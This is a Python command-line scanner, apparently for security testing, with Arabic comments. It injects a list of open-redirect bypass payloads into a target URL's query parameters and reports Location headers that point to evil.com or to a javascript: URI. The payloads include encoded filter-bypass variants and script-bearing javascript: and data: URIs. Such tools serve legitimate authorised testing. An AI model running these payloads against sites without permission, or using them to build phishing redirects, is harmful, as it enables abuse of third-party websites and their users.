#!/usr/bin/env python3
import requests
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor

# Payloads للاختبار
REDIRECT_PAYLOADS = [
    'https://evil.com',
    '//evil.com',
    '///evil.com',
    '////evil.com',
    '/\\evil.com',
    '\\\\evil.com',
    'https:evil.com',
    'https:/evil.com',
    'https:///evil.com',
    'http://evil.com',
    'https://evil.com%23.target.com',
    'https://target.com@evil.com',
    'https://evil.com#target.com',
    'https://evil.com?target.com',
    '/%09/evil.com',
    '//%09/evil.com',
    '/%2F/evil.com',
    '/%5C/evil.com',
    'https://evil.com\\@target.com',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
]

# Headers
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Security-Scanner)',
}

def test_redirect(url, param, payload):
    """يختبر payload واحد"""
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_query))
        
        r = requests.get(new_url, headers=HEADERS, timeout=5, allow_redirects=False)
        
        # فحص Location header
        location = r.headers.get('Location', '')
        
        if not location:
            return None
        
        # فحص إذا evil.com في Location
        if 'evil.com' in location.lower():
            return {
                'param': param,
                'payload': payload,
                'url': new_url,
                'location': location,
                'status': r.status_code,
                'severity': 'CRITICAL'
            }
        
        # فحص JavaScript
        if 'javascript:' in location.lower():
            return {
                'param': param,
                'payload': payload,
                'url': new_url,
                'location': location,
                'status': r.status_code,
                'severity': 'HIGH'
            }
        
    except:
        pass
    return None

def scan_redirect(url):
    print(f"\n{'='*60}")
    print(f"  Open Redirect Scanner")
    print(f"  Target: {url}")
    print(f"{'='*60}\n")
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        print("[-] No parameters found in URL")
        print("[*] Example: https://example.com/redirect?url=test")
        return []
    
    print(f"[*] Found {len(params)} parameter(s): {list(params.keys())}")
    print(f"[*] Testing {len(REDIRECT_PAYLOADS)} payloads...\n")
    
    found = []
    
    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = []
        for param in params:
            for payload in REDIRECT_PAYLOADS:
                futures.append(ex.submit(test_redirect, url, param, payload))
        
        for future in futures:
            result = future.result()
            if result:
                found.append(result)
                print(f"  [!] {result['severity']}")
                print(f"      Param: {result['param']}")
                print(f"      Payload: {result['payload']}")
                print(f"      Location: {result['location']}")
                print(f"      Status: {result['status']}\n")
    
    print(f"{'='*60}")
    print(f"  Found: {len(found)} potential redirects")
    print(f"{'='*60}\n")
    
    return found

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 open_redirect_scanner.py <url>")
        print("Example: python3 open_redirect_scanner.py 'https://example.com/redirect?url=test'")
        sys.exit(1)
    
    scan_redirect(sys.argv[1])
